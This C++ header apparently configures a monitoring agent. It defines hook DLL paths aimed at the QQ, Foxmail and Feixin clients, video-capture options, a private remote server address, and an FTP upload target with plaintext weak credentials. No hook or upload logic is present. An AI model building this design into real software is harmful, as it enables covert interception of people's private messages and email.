#pragma once

#define __STDC_CONSTANT_MACROS

#ifdef _WIN32
#define snprintf _snprintf

//Windows
extern "C"
{
#include "libavutil/opt.h"
#include "libavcodec/avcodec.h"
#include "libavformat/avformat.h"
#include "libavutil/mathematics.h"
#include "libavutil/time.h"
#include "libavfilter/avfiltergraph.h"
#include "libavfilter/buffersink.h"
#include "libavfilter/buffersrc.h"
#include "libavutil/avutil.h"
#include "libswscale/swscale.h"
#include "libavdevice/avdevice.h"
#include "libswresample/swresample.h"
#include "libavutil/audio_fifo.h"
//#include "SDL/SDL.h"
};
#else
//Linux...
#ifdef __cplusplus
extern "C"
{
#endif
#include "libavutil/opt.h"
#include "libavcodec/avcodec.h"
#include "libavformat/avformat.h"
#include "libavutil/mathematics.h"
#include "libavutil/time.h"
#include "libavfilter/avfiltergraph.h"
#include "libavfilter/buffersink.h"
#include "libavfilter/buffersrc.h"
#include "libavutil/avutil.h"
#include "libswscale/swscale.h"
#include "libavdevice/avdevice.h"
#include "libswresample/swresample.h"
#include "libavutil/audio_fifo.h"
//#include <SDL/SDL.h>
#ifdef __cplusplus
};
#endif
#endif

//Output YUV420P 
#define OUTPUT_YUV420P 0
//'1' Use Dshow 
//'0' Use VFW
#define USE_DSHOW 0


#define COLOR_RED	FOREGROUND_RED
#define COLOR_GREEN FOREGROUND_GREEN
#define COLOR_BLUE  FOREGROUND_BLUE
#define COLOR_YELLOW	(FOREGROUND_RED | FOREGROUND_GREEN)
#define COLOR_MAGENTA	(FOREGROUND_RED | FOREGROUND_BLUE)
#define COLOR_CYAN		(FOREGROUND_GREEN | FOREGROUND_BLUE)
#define COLOR_WHITE		(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
#define DEFAULT_COLOR COLOR_WHITE

#define DEFAULT_AGENT_PATH  "C:\\agent"
#define DEFAULT_AGENT_LOG_PATH  "C:\\agent\\log"
#define DEFAULT_AGENT_LOG_FILE_PATH  "C:\\agent\\log\\log.txt"

#define DEFAULT_HOOK_DLL   "C:\\agent"
#define DEFAULT_HOOK_TECENT_DLL32  "C:\\agent\\hook.dll"
#define DEFAULT_HOOK_FOXMAIL_DLL32 "C:\\agent\\hook.dll"
#define DEFAULT_HOOK_FEIXIN_DLL32  "C:\\agent\\hook.dll"
#define DEFAULT_HOOK_TECENT_DLL64  "C:\\agent\\hook.dll"
#define DEFAULT_HOOK_FOXMAIL_DLL64 "C:\\agent\\hook.dll"
#define DEFAULT_HOOK_FEIXIN_DLL64  "C:\\agent\\hook.dll"

#define BUFFERSIZE  4096

#define TIMER 1

#define MAX_BUFFER_LEN        8192  
#define DEFAULT_PORT          12345    
#define DEFAULT_IP            "127.0.0.1"
#define REMOTE_SERVER_IP      "192.168.2.203"
//#define REMOTE_SERVER_IP      "192.168.2.185"
#define REMOTE_PORT            7086
//#define REMOTE_PORT            9527

#define aFullpath32	          L"guard_qq.dll"
#define aFullpath64           L"guard_qq.dll"

// #define LOCAL_FILE      "/tmp/uploadthis.txt"
// #define UPLOAD_FILE_AS  "while-uploading.txt"
// #define REMOTE_URL      "ftp://example.com/"  UPLOAD_FILE_AS
#define REMOTE_URL         "ftp://192.168.2.203/"
// #define RENAME_FILE_TO  "renamed-and-fine.txt"
#define USRPASSWD           "ftpuser1:123456"
#define USRPASSWD1          "ftpuser2:123456"
#define USRPASSWD2          "ftpuser3:123456"

#ifndef SAFE_DELETE 
#define SAFE_DELETE(p) { if(p){delete(p);  (p)=NULL;} }
#endif
 
#ifndef SAFE_DELETE_ARRAY
#define SAFE_DELETE_ARRAY(p) { if(p){delete[] (p);  (p)=NULL;} }
#endif
 
#ifndef SAFE_RELEASE
#define SAFE_RELEASE(p) { if(p){ (p)->Release();  (p)=NULL;} }
#endif
